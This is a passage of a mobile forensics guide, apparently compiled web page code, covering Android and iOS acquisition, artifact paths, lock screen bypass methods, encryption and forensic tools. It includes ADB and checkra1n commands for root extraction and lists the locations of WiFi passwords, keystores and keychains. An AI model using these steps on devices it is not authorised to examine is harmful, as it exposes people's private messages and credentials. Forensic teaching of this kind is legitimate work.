      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Logical"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "File system access via OS APIs"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Call logs, SMS, contacts, media, app data"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ADB, UFED Logical, Magnet AXIOM"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "15-60 min"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Physical"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Bit-for-bit copy of flash memory"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "All data including deleted files, unallocated space"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "JTAG, chip-off, ISP, Cellebrite UFED Physical"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2-8 hours"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "File System"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Full file system extraction (requires root/jailbreak)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "All files including app databases"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ADB root, jailbreak + tar"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "30 min-2 hours"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Cloud"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Extraction from backup in cloud"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "iCloud, Google Drive, WhatsApp backup"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Elcomsoft Cloud Explorer, Oxygen"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "1-4 hours"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Manual"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Human review and photograph of device"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Visual data only"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Camera, video recording"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "30 min-2 hours"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "Advanced Logical"
            })
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Agent-based extraction on device"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "More data than logical, less than physical"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cellebrite Advanced Logical, UFED 4PC"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "1-3 hours"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "72-android-forensics",
      children: "7.2 Android Forensics"
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "android-acquisition-methods",
      children: "Android Acquisition Methods"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# 1. ADB (Android Debug Bridge) → logical acquisition\n\n# Check if ADB is accessible\nadb devices -l\n# Output:\n# List of devices attached\n# 0123456789ABCDEF       device product:model\n\n# Enable ADB on device:\n# Settings → Developer Options → USB Debugging\n# If Developer Options hidden: Settings → About Phone → Tap Build Number 7 times\n\n# Pull user-installed apps\nadb shell pm list packages -3 > installed_apps.txt\n\n# Pull app APK\nadb shell pm path com.whatsapp\n# package:/data/app/com.whatsapp-1/base.apk\nadb pull /data/app/com.whatsapp-1/base.apk whatsapp.apk\n\n# Pull external storage\nadb pull /sdcard/ evidence/sdcard/\n\n# Pull application data (requires root)\nadb root\nadb shell\n# → su\n# → tar -cvf /data/local/tmp/data.tar /data/data/\nadb pull /data/local/tmp/data.tar data.tar\n\n# 2. Recovery mode acquisition (bypasses lock screen):\n# Power off → Hold Volume Down + Power (varies by device)\n# → Use ADB in recovery (some recoveries support ADB)\n\n# 3. Android backup extraction (no root needed)\nadb backup -f android_backup.ab -apk -shared -all -system\n# Decrypt backup (requires password if set)\ndd if=android_backup.ab bs=1 skip=24 | python -c \"import zlib,sys;sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))\" > backup.tar\ntar -xvf backup.tar\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "android-forensic-artifacts",
      children: "Android Forensic Artifacts"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Artifact"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Path"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Forensic Value"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SMS/MMS Database"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "/data/data/com.android.providers.telephony/databases/mmssms.db"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "All text messages"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Call Log"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "/data/data/com.android.providers.contacts/databases/contacts2.db"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Call history, contacts"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "WhatsApp Database"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "/data/data/com.whatsapp/databases/msgstore.db"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "WhatsApp messages"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "WhatsApp Media"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "WhatsApp media files"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Browser History"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "/data/data/com.android.chrome/app_chrome/Default/History"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Browsing history"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "WiFi Passwords"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "/data/misc/wifi/wpa_supplicant.conf"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Saved WiFi credentials"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "GPS Locations"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "/data/data/com.google.android.gms/files/"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Google location history"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Accounts"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "/data/system/accounts.db"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Synced Google/email accounts"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Installed Apps"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "/data/system/packages.list"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "All installed packages"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Keystore"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "/data/misc/keystore/"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Stored cryptographic keys"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "android-file-system",
      children: "Android File System"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Partition"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Mount Point"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Contents"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Forensic Interest"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "/boot"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "→"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Kernel, ramdisk"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Not typically analyzed"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "/system"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "/system"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "OS files, pre-installed apps"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low (read-only)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "/data"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "/data"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "User data, app data, settings"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: [(0,jsx_runtime.jsx)(_components.strong, {
              children: "High"
            }), " → primary target"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "/cache"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "/cache"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Temporary data"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "/recovery"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "→"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Recovery mode kernel"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "/sdcard"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "/sdcard or /storage/emulated/0"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "User storage"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High → media, downloads"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "android-lock-screen-bypass",
      children: "Android Lock Screen Bypass"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Method"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Requirements"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Success Rate"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Notes"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "ADB with USB debugging"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "USB debugging already enabled"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Requires unlock once after reboot"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Recovery ADB"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Custom recovery (TWRP)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Wipes device if encryption enabled"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Samsung FRP bypass"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Samsung device"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Medium"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Bypasses factory reset protection"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Cellebrite UFED"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cellebrite hardware"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Physical extraction"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Brute force (exhaustive)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Simple PIN/pattern"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low-Medium"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Time-consuming"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "MTP (Media Transfer Protocol)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "MTP enabled"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Low"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Only media files accessible"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "73-ios-forensics",
      children: "7.3 iOS Forensics"
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "ios-acquisition-methods",
      children: "iOS Acquisition Methods"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# 1. iTunes Backup (logical)\n# Connect iPhone to trusted computer\n# iTunes → Summary → Back Up Now\n# Backup location:\n# Windows: %APPDATA%\\Apple Computer\\MobileSync\\Backup\\\n# macOS: ~/Library/Application Support/MobileSync/Backup/\n\n# Extract iTunes backup\n# Using libimobiledevice (cross-platform)\nidevicebackup2 backup --full /evidence/ios_backup/\n\n# Using iBackupBot (Windows/Mac)\n# Open the backup in iBackupBot GUI\n\n# 2. Checkm8 bootrom exploit (iPhone 4S-8, up to iOS 14.8.1)\n# Physical extraction using checkm8-based tools\n./checkra1n -c\nssh root@127.0.0.1 -p 2222\n# Now have root shell on device\n\n# 3. Jailbreak extraction (iPhone 5s-X, specific iOS versions)\n# Using palera1n or unc0ver\n# Run jailbreak tool → install OpenSSH → SSH into device\n\n# 4. Cellebrite UFED → physical extraction\n# Use UFED hardware/software with appropriate cable\n\n# 5. Cloud extraction → iCloud backup\n# Requires Apple ID credentials or authentication token\n# Using Elcomsoft Phone Breaker or Cellebrite cloud\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "ios-forensic-artifacts",
      children: "iOS Forensic Artifacts"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Artifact"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Database/File"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Path in Backup"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SMS/iMessage"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "sms.db"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "3d0d7e5fb2ce288813306e4d4636395e047a3d28"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Call History"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CallHistory.storedata"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2b2..."
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Contacts"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AddressBook.sqlitedb"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "31..."
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Safari History"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "History.db"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "5c..."
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Notes"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "notes.sqlite"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "8c..."
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Photos"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "PhotoLibrary.apdb"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "(in Media folder)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "WhatsApp"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ChatStorage.sqlite"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AppDomain-com.whatsapp.net/"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Keychain"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "keychain-2.db"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "System keychain (encrypted)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Location Data"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "cache_encryptedB.db"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Solid-state drive..."
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Health Data"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "healthdb_secure.sqlite"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AppDomain-com.apple.Health/"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Calendar"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Calendar.sqlitedb"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2c..."
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "WiFi"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "com.apple.wifi.plist"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "SystemPreferences/"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Voicemail"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "voicemail.db"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "88..."
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "App State"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "appState.sqlite"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "6c6ba..."
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Geometry Cache"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "icons_state.plist"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Springboard/"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h4, {
      id: "ios-encryption-considerations",
      children: "iOS Encryption Considerations"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "iOS Version"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Data Protection Class"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Forensics Implications"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "iOS 4-7"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "NSFileProtectionComplete"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Most data accessible after first unlock"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "iOS 8-9"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hardware encryption, passcode required"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Very limited access without passcode"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "iOS 10-12"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Enhanced encryption, Secure Enclave"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Physical extraction requires exploit"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "iOS 13+"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "USB Restricted Mode"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Data port disabled after 1 hour without unlock"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "iOS 14+"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Enhanced privacy features"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Limited cellular/network data access"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "iOS 15+"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "iCloud Private Relay, Enhanced lock screen"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "More data in cloud, less on device"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "iOS 16+"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Lockdown Mode"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Maximum security, minimum forensic access"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "74-mobile-forensics--key-challenges",
      children: "7.4 Mobile Forensics → Key Challenges"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Challenge"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Mitigation"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Encryption"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Modern devices encrypt by default"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Capture immediately after device unlock"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Lock screen"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cannot access without passcode"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Use logical extraction if ADB/iTunes enabled"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Remote wipe"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Device can be wiped remotely"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Faraday bag/isolation immediately"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Auto-lock"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Screen locks after timeout"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Disable auto-lock before acquisition"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "App-specific encryption"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Signal, Telegram have their own encryption"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Data accessible only from unlocked app"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Cloud syncing"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Evidence may be overwritten by sync"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Airplane mode immediately"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Anti-forensics"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Some apps detect jailbreak/root"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Check for root detection bypass tools"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Data fragmentation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Android OEMs vary widely"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Research specific device model"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "75-mobile-forensics-tools-comparison",
      children: "7.5 Mobile Forensics Tools Comparison"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Tool"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Platform"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Capabilities"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Price"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Best For"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Cellebrite UFED"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Android, iOS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Physical, logical, file system, cloud"
